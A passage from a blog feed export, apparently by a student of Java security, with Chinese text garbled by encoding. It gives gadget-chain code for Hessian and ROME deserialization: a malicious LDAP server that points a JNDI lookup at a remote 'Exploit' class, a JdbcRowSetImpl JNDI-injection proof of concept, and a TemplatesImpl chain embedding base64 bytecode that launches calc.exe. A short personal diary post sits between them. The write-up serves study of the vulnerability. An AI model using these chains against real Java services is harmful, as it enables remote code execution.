class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br><br>        <span class="hljs-keyword">private</span> URL codebase;<br><br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span> <span class="hljs-params">( URL cb )</span> &#123;<br>            <span class="hljs-built_in">this</span>.codebase = cb;<br>        &#125;<br><br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &#123;<span class="hljs-doctag">@inheritDoc</span>&#125;</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * <span class="hljs-doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result )</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                sendResult(result, base, e);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> ( Exception e1 ) &#123;<br>                e1.printStackTrace();<br>            &#125;<br><br>        &#125;<br><br><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> LDAPException, MalformedURLException &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br>            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;Exploit&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);<br>            <span class="hljs-keyword">if</span> ( refPos &gt; <span class="hljs-number">0</span> ) &#123;<br>                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);<br>            &#125;<br>            e.addAttribute(<span class="hljs-string">&quot;javaCodeBase&quot;</span>, cbstring);<br>            e.addAttribute(<span class="hljs-string">&quot;objectClass&quot;</span>, <span class="hljs-string">&quot;javaNamingReference&quot;</span>);<br>            e.addAttribute(<span class="hljs-string">&quot;javaFactory&quot;</span>, <span class="hljs-built_in">this</span>.codebase.getRef());<br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianInput;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianOutput;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><span class="hljs-keyword">import</span> marshalsec.gadgets.JDKUtil;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HessianRomeJdbc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jndiUrl</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ldap://127.0.0.1:1389/xs&quot;</span>;<br>        <span class="hljs-type">JdbcRowSetImpl</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcRowSetImpl</span>();<br>        rs.setDataSourceName(jndiUrl);<br><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(JdbcRowSetImpl.class, rs);<br><br>        <span class="hljs-type">EqualsBean</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ToStringBean.class, item);<br><br>        HashMap&lt;Object, Object&gt; map = JDKUtil.makeMap(root, root);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>(<span class="hljs-number">1</span>);<br>        <span class="hljs-type">HessianOutput</span> <span class="hljs-variable">hessianOutput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianOutput</span>(byteArrayOutputStream);<br>        hessianOutput.writeObject(map);<br><br>        <span class="hljs-type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">byteArrayInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">HessianInput</span> <span class="hljs-variable">hessianInput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianInput</span>(byteArrayInputStream);<br>        hessianInput.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>é¦–å…ˆæˆ‘ä»¬çŸ¥é“<code>ToStringBean.toString()</code>ä¼šè°ƒç”¨ä¼ å…¥çš„ç±»çš„getteræ–¹æ³•ï¼Œè‡ªç„¶å°±ä¼šè°ƒç”¨åˆ°<code>JdbcRowSetImpl.getDatabaseMetaData</code>ï¼Œ<br>çœ‹ä¸€ä¸‹è¿™ä¸ªæ–¹æ³•ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203301608372.png" alt="QQæˆªå›¾20220330155125"></p><p>è·Ÿè¿›çœ‹ä¸€ä¸‹connectæ–¹æ³•ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203301608533.png" alt="QQæˆªå›¾20220330155207"></p><p>å¯ä»¥æ³¨æ„åˆ°è¿™é‡Œè¿›å…¥<code>lookup()</code>ï¼Œå¹¶ä¸”å‚æ•°å¯ä»¥æ§åˆ¶ã€‚</p><p>å…¶ä»–åœ°æ–¹è·Ÿç€è°ƒç”¨é“¾å°±å¾ˆå¥½ç†è§£ã€‚<br>å”¯ç‹¬è¿™ä¸ª<strong>HashMap&lt;Object, Object&gt; map &#x3D; JDKUtil.makeMap(root, root);</strong></p><p>è¿™é‡Œçš„makMapï¼Œä¸Šä¸€ç¯‡å…¶å®äº†è§£åˆ°ï¼Œè¿™é‡Œä¸èƒ½ç”¨æ™®é€šçš„mapä»£æ›¿ï¼Œæ‰€ä»¥å®ƒåˆ°åº•å¹²äº†ä»€ä¹ˆï¼Ÿå•ç‹¬å¼„ä¸€ç¯‡å­¦ä¹ ä¸€ä¸‹ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Hessian</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è®°å½•ä¸€æ¬¡ç«é€‰</title>
    <link href="/2022/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E7%AB%9E%E9%80%89/"/>
    <url>/2022/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E7%AB%9E%E9%80%89/</url>
    
    <content type="html"><![CDATA[<p>-æ˜¨å¤©æ²¡æœ‰ä¸Šä¼ æˆåŠŸã€‚</p><p>æƒ³äº†æƒ³è¿˜æ˜¯è®°å½•ä¸€ä¸‹ã€‚ä»¥å‰æ„Ÿè§‰ä¸Šè¯¾ä¸Šå»è®²pptï¼Œéƒ½å¾ˆæ— æ‰€è°“çš„æ„Ÿè§‰ï¼ˆæ„Ÿè§‰å°±æ˜¯å¹³æ—¶æ²¡æœ‰ç§¯æå¯¹å¾…ï¼Œå¯¼è‡´æ­£ç»äº‹çš„æ—¶å€™å°±æ°´äº†~~ï¼‰ã€‚ä»Šå¤©ä¸Šå»ç«é€‰åä½³é’å¹´çš„æ—¶å€™ï¼Œ7-8ä¸ªè¾…å¯¼å‘˜éƒ½åœ¨ï¼ŒçœŸçš„å¥½ç´§å¼ ã€‚ä¸Šå»è®²çš„æ—¶å€™å…¶å®ä¹Ÿè¿˜å¥½ï¼ˆä¸ªäººæ„Ÿè§‰ï¼‰ã€‚è®²å®Œä¹‹åï¼Œæ–‡è€å¸ˆå°±è·Ÿæˆ‘è¯´ï¼šâ€œå¼ æ ©å•Šï¼Œä½ è¿™pptåšçš„è¿˜æŒºå¥½ï¼Œæ€ä¹ˆè®²çš„è¿™ä¸ªæ ·å­å•Šï¼Œè¿˜å®³ç¾å•Šï¼Ÿä¸è¦ç´§å¼ å•Šï¼Œå¤šç»ƒä¹ ï¼Œå‡†å¤‡ä¸€ä¸‹ç¨¿å­å˜›ã€‚â€çœŸä¸çŸ¥é“ä¹‹åè¿˜è¦åœ¨å…¨æ ¡é¢å‰è®²çš„æ—¶å€™ä¼šæ€ä¹ˆæ ·ã€‚å¸Œæœ›æ˜¯æ¸…æ˜èŠ‚ä¹‹ååœ¨å¼„è¿™äº›äº‹æƒ…ï¼Œåˆ°æ—¶å€™è¿˜å¯ä»¥è·Ÿæˆ‘çš„çŒªå„¿æ¼”ç»ƒä¸€ä¸‹ã€‚ä¸è¿‡ä»Šå¤©æ‰å‘ç°ï¼Œå­¦æ ¡çœŸçš„å¾ˆå¤šä½è°ƒçš„å¤§ä½¬ï¼Œæ¬£èµä»–ä»¬èƒ½å¤Ÿå¤„ä¹‹æ³°ç„¶çš„æ„Ÿè§‰ã€‚å˜¿å˜¿é™„ä¸Šæˆ‘æ¼”è®²çš„æ—¶å€™çš„ç…§ç‰‡ã€‚æ˜¨å¤©è¿™ç¯‡æ–‡ç« æ²¡æœ‰ä¼ ä¸Šå»ï¼Œä»Šå¤©å¾ˆæ— å¥ˆï¼Œè¢«è€å¸ˆç»™æˆ‘æ›¿æ¢äº†ã€‚å°±æ˜¯çƒ¦ç‡¥è‡ªå·±å†™äº†é‚£ä¹ˆå¤šçš„ææ–™å’Œåšäº†pptï¼Œè¢«è«åå…¶å¦™æ›¿æ¢äº†ã€‚è€å¸ˆç»™å‡ºçš„è§£é‡Šè®©æˆ‘ä¸èƒ½ç†è§£ï¼Œå› ä¸ºæˆ‘æ„Ÿè§‰æˆ‘æ¯”æŸäº›äººçš„æˆç»©è¦å¥½ã€‚okæ´—æ¾¡å»äº†ã€‚<img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203292323199.jpg" alt="Screenshot_20220329_232326_com.tencent.mobileqq"><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203282242164.jpg" alt="Cache_3720d6c433f9baef."></p>]]></content>
    
    
    <categories>
      
      <category>å†ç¨‹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å†ç¨‹</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hessianä¹‹ROMEé“¾</title>
    <link href="/2022/03/28/Hessian%E4%B9%8BROME%E9%93%BE/"/>
    <url>/2022/03/28/Hessian%E4%B9%8BROME%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="Hessianä¹‹ROMEé“¾"><a href="#Hessianä¹‹ROMEé“¾" class="headerlink" title="Hessianä¹‹ROMEé“¾"></a>Hessianä¹‹ROMEé“¾</h1><p>å…ˆæ¥ç§ç§romeçš„åˆ©ç”¨é“¾ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap.readObject()<br>    ObjectBean.hashCode()<br>            EqualsBean.beanHashCode()<br>                ObjectBean.toString()<br>                    ToStringBean.toString()<br>                     TemplatesImpl.getOutputProperties()<br></code></pre></td></tr></table></figure><p>å…¶å®æ„Ÿè§‰è¿™æ ·ä¸€æ¥æ¯”ROMEä¼šç®€å•è®¸å¤šï¼Œå› ä¸ºä¸ç”¨æ„é€ è£…é¥°+æ„é€ hashmapäº†ã€‚å°±æ˜¯è€ƒè™‘å¦‚ä¸‹ä»£ç å¦‚ä½•åŠ å…¥ååºåˆ—åŒ–ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rome</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">delegate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(Templates.class, templates);<br>        delegate.toString();<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="é”™è¯¯poc"><a href="#é”™è¯¯poc" class="headerlink" title="é”™è¯¯poc"></a>é”™è¯¯poc</h2><p>åŠ å…¥ååºåˆ—åŒ–ä¹‹åï¼Œè¿™ä¸€æ­¥å…¶å®å¾ˆç®€å•ï¼Œåˆ é™¤äº†hashmapéƒ¨åˆ†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianInput;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianOutput;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HessianTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span 